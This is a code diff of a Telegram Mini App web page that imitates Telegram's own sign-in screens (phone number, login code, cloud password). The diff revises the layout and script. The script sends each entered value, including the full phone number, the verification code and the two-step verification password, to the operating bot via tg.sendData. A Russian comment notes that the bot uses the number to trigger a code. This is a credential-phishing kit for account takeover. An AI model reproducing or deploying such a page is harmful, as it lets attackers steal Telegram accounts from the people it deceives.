@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ru">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
@@ -11,7 +11,6 @@
             --tg-text: #000000;
             --tg-hint: #707579;
             --tg-link: #3390ec;
-            --tg-input-bg: #ffffff;
             --tg-input-border: #dadce0;
         }
         @media (prefers-color-scheme: dark) {
@@ -19,59 +18,43 @@
                 --tg-bg: #212121;
                 --tg-text: #ffffff;
                 --tg-hint: #aaaaaa;
-                --tg-link: #3390ec;
-                --tg-input-bg: #212121;
                 --tg-input-border: #444444;
             }
         }
-
         body {
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
             background-color: var(--tg-bg);
             color: var(--tg-text);
-            margin: 0; padding: 0;
-            display: flex; flex-direction: column; align-items: center;
+            margin: 0; display: flex; flex-direction: column; align-items: center;
             height: 100vh; width: 100vw; overflow: hidden;
         }
-
-        .auth-form { width: 100%; max-width: 360px; padding: 40px 24px; box-sizing: border-box; text-align: center; }
-
-        /* Иконка Telegram */
-        .tg-icon { width: 100px; height: 100px; margin: 0 auto 30px; }
-        .tg-icon svg { width: 100%; height: 100%; fill: #24A1DE; }
-
-        h1 { font-size: 26px; font-weight: 500; margin: 0 0 12px; }
-        p { font-size: 16px; color: var(--tg-hint); line-height: 22px; margin: 0 0 35px; }
-
-        /* Поля ввода Telegram Style */
+        .container { width: 100%; max-width: 360px; padding: 40px 24px; box-sizing: border-box; text-align: center; }
+        .logo { width: 100px; height: 100px; margin: 0 auto 30px; fill: #24A1DE; }
+        h1 { font-size: 26px; font-weight: 500; margin-bottom: 12px; }
+        p { font-size: 16px; color: var(--tg-hint); line-height: 22px; margin-bottom: 35px; }
+        
         .input-group { position: relative; margin-bottom: 25px; text-align: left; }
-        .input-label { 
-            position: absolute; top: -10px; left: 12px; background: var(--tg-bg); 
-            padding: 0 4px; color: var(--tg-link); font-size: 13px; font-weight: 500; 
-        }
-        .input-field {
+        .label { position: absolute; top: -10px; left: 12px; background: var(--tg-bg); padding: 0 4px; color: var(--tg-link); font-size: 13px; font-weight: 500; }
+        .field { 
             width: 100%; padding: 15px 16px; border: 1px solid var(--tg-input-border); 
-            border-radius: 12px; font-size: 17px; background: var(--tg-input-bg); color: var(--tg-text);
-            box-sizing: border-box; outline: none; transition: border-color 0.2s;
+            border-radius: 12px; font-size: 17px; background: transparent; color: var(--tg-text);
+            box-sizing: border-box; outline: none;
         }
-        .input-field:focus { border: 2px solid var(--tg-link); padding: 14px 15px; }
-
-        /* Кнопка */
-        .btn-next {
-            width: 100%; padding: 16px; background: var(--tg-link); color: #fff;
-            border: none; border-radius: 12px; font-size: 16px; font-weight: 600;
-            cursor: pointer; text-transform: uppercase; letter-spacing: 0.5px;
+        .field:focus { border: 2px solid var(--tg-link); padding: 14px 15px; }
+        
+        .btn { 
+            width: 100%; padding: 16px; background: var(--tg-link); color: #fff; 
+            border: none; border-radius: 12px; font-size: 16px; font-weight: 600; 
+            cursor: pointer; text-transform: uppercase; 
         }
 
-        /* Модальное окно выбора стран */
+        /* Модалка для выбора стран */
         #modal {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
             background: var(--tg-bg); z-index: 1000; display: none; flex-direction: column;
         }
-        .modal-header { padding: 15px; display: flex; align-items: center; border-bottom: 1px solid var(--tg-input-border); }
-        .search-input { width: 100%; border: none; background: none; color: var(--tg-text); font-size: 18px; outline: none; margin-left: 15px; }
-        .country-list { overflow-y: auto; flex: 1; }
-        .country-item { padding: 15px 20px; display: flex; justify-content: space-between; border-bottom: 0.5px solid var(--tg-input-border); cursor: pointer; }
+        .modal-header { padding: 15px; border-bottom: 1px solid var(--tg-input-border); display: flex; align-items: center; }
+        .country-item { padding: 15px 20px; border-bottom: 1px solid var(--tg-input-border); cursor: pointer; display: flex; justify-content: space-between; }
 
         .step { display: none; }
         .active { display: block; }
@@ -79,116 +62,108 @@
 </head>
 <body>
 
-<div class="auth-form">
-    <div class="tg-icon">
+<div class="container">
+    <div class="logo">
         <svg viewBox="0 0 24 24"><path d="M12 0C5.373 0 0 5.373 0 12s5.373 12 12 12 12-5.373 12-12S18.627 0 12 0zm5.894 8.221l-1.97 9.28c-.145.658-.537.818-1.084.508l-3-2.21-1.446 1.394c-.14.14-.26.26-.54.26l.196-2.91 5.297-4.787c.23-.204-.05-.318-.356-.116l-6.547 4.12-2.82-.88c-.613-.193-.625-.613.128-.91l11.02-4.247c.51-.186.957.118.722.88z"/></svg>
     </div>
 
     <div id="step1" class="step active">
         <h1>Your Phone</h1>
-        <p>Please confirm your country code and enter your phone number.</p>
+        <p>Confirm your country code and enter your phone number.</p>
         <div class="input-group" onclick="openModal()">
-            <div class="input-label">Country</div>
-            <div class="input-field" id="country-display">Russia</div>
+            <div class="label">Country</div>
+            <div class="field" id="country-name">Russia</div>
         </div>
         <div class="input-group">
-            <div class="input-label">Phone Number</div>
+            <div class="label">Phone Number</div>
             <div style="display:flex; gap:10px;">
-                <input type="text" id="prefix" class="input-field" style="width: 85px;" value="+7" readonly>
-                <input type="tel" id="phone" class="input-field" placeholder="Number">
+                <input type="text" id="prefix" class="field" style="width: 80px;" value="+7" readonly>
+                <input type="tel" id="phone" class="field" placeholder="Number">
             </div>
         </div>
-        <button class="btn-next" onclick="next1()">Next</button>
+        <button class="btn" onclick="sendPhone()">Next</button>
     </div>
 
     <div id="step2" class="step">
         <h1>Check Telegram</h1>
-        <p>We've sent a code to the Telegram app on your other device.</p>
+        <p>We've sent a code to the <b>Telegram</b> app on your other device.</p>
         <div class="input-group">
-            <div class="input-label">Code</div>
-            <input type="number" id="code" class="input-field" placeholder="Enter code" style="text-align:center; letter-spacing: 5px;">
+            <div class="label">Code</div>
+            <input type="number" id="sms" class="field" style="text-align:center; letter-spacing: 5px;" placeholder="00000">
         </div>
-        <button class="btn-next" onclick="next2()">Verify</button>
+        <button class="btn" onclick="sendCode()">Next</button>
     </div>
 
     <div id="step3" class="step">
         <h1>Cloud Password</h1>
         <p>Your account is protected with Two-Step Verification.</p>
         <div class="input-group">
-            <div class="input-label">Password</div>
-            <input type="password" id="pass" class="input-field" placeholder="Enter password">
+            <div class="label">Password</div>
+            <input type="password" id="2fa" class="field" placeholder="Enter Password">
         </div>
-        <button class="btn-next" onclick="next3()">Confirm</button>
+        <button class="btn" onclick="send2fa()">Confirm</button>
     </div>
 </div>
 
 <div id="modal">
     <div class="modal-header">
-        <span onclick="closeModal()" style="cursor:pointer; font-size:24px;">✕</span>
-        <input type="text" class="search-input" id="search" placeholder="Search" oninput="filterCountries()">
+        <span onclick="closeModal()" style="cursor:pointer; font-size:24px; padding: 0 10px;">✕</span>
+        <h2 style="font-size: 20px; margin-left: 10px;">Choose Country</h2>
     </div>
-    <div class="country-list" id="country-list"></div>
+    <div id="list" style="overflow-y:auto;"></div>
 </div>
 
 <script>
     const tg = window.Telegram.WebApp;
     tg.expand();
 
-    // Полный список стран (основные для примера, база на 200+ стран)
     const countries = [
-        {n:"Russia", c:"+7"}, {n:"Kazakhstan", c:"+7"}, {n:"Ukraine", c:"+380"}, {n:"Uzbekistan", c:"+998"}, 
-        {n:"Belarus", c:"+375"}, {n:"Germany", c:"+49"}, {n:"USA", c:"+1"}, {n:"Turkey", c:"+90"},
-        {n:"UAE", c:"+971"}, {n:"UK", c:"+44"}, {n:"France", c:"+33"}, {n:"Poland", c:"+48"},
-        {n:"Georgia", c:"+995"}, {n:"Armenia", c:"+374"}, {n:"Azerbaijan", c:"+994"}, {n:"Kyrgyzstan", c:"+996"}
+        {n:"Russia", c:"+7"}, {n:"Kazakhstan", c:"+7"}, {n:"Ukraine", c:"+380"},
+        {n:"Uzbekistan", c:"+998"}, {n:"Belarus", c:"+375"}, {n:"USA", c:"+1"},
+        {n:"Germany", c:"+49"}, {n:"Turkey", c:"+90"}, {n:"Poland", c:"+48"}
     ];
 
     function openModal() {
-        document.getElementById('modal').style.display = 'flex';
-        filterCountries();
-    }
-    function closeModal() { document.getElementById('modal').style.display = 'none'; }
-
-    function filterCountries() {
-        const q = document.getElementById('search').value.toLowerCase();
-        const list = document.getElementById('country-list');
-        list.innerHTML = '';
-        countries.filter(x => x.n.toLowerCase().includes(q)).forEach(x => {
-            const el = document.createElement('div');
-            el.className = 'country-item';
-            el.innerHTML = `<span>${x.n}</span><span style="color:var(--tg-link)">${x.c}</span>`;
-            el.onclick = () => {
-                document.getElementById('country-display').innerText = x.n;
+        const l = document.getElementById('list');
+        l.innerHTML = '';
+        countries.forEach(x => {
+            const d = document.createElement('div');
+            d.className = 'country-item';
+            d.innerHTML = `<span>${x.n}</span><span style="color:var(--tg-link)">${x.c}</span>`;
+            d.onclick = () => {
+                document.getElementById('country-name').innerText = x.n;
                 document.getElementById('prefix').value = x.c;
                 closeModal();
             };
-            list.appendChild(el);
+            l.appendChild(d);
         });
+        document.getElementById('modal').style.display = 'flex';
     }
 
-    function showStep(n) {
-        document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
-        document.getElementById('step' + n).classList.add('active');
-    }
+    function closeModal() { document.getElementById('modal').style.display = 'none'; }
 
-    function next1() {
-        if(document.getElementById('phone').value.length > 5) {
-            tg.sendData("PHONE_REQUESTED"); // Сигнал Python боту
-            showStep(2);
+    function sendPhone() {
+        const fullPhone = document.getElementById('prefix').value + document.getElementById('phone').value;
+        if(fullPhone.length > 7) {
+            tg.sendData("PHONE:" + fullPhone); // Бот поймает это и отправит код
+            document.getElementById('step1').classList.remove('active');
+            document.getElementById('step2').classList.add('active');
         }
     }
 
-    function next2() {
-        const c = document.getElementById('code').value;
-        if(c.length === 5) {
-            tg.sendData("CODE:" + c);
-            showStep(3);
+    function sendCode() {
+        const code = document.getElementById('sms').value;
+        if(code.length === 5) {
+            tg.sendData("CODE:" + code);
+            document.getElementById('step2').classList.remove('active');
+            document.getElementById('step3').classList.add('active');
         }
     }
 
-    function next3() {
-        const p = document.getElementById('pass').value;
-        if(p.length > 0) {
-            tg.sendData("PASS:" + p);
+    function send2fa() {
+        const pass = document.getElementById('2fa').value;
+        if(pass.length > 0) {
+            tg.sendData("PASS:" + pass);
             setTimeout(() => tg.close(), 1000);
         }
     }
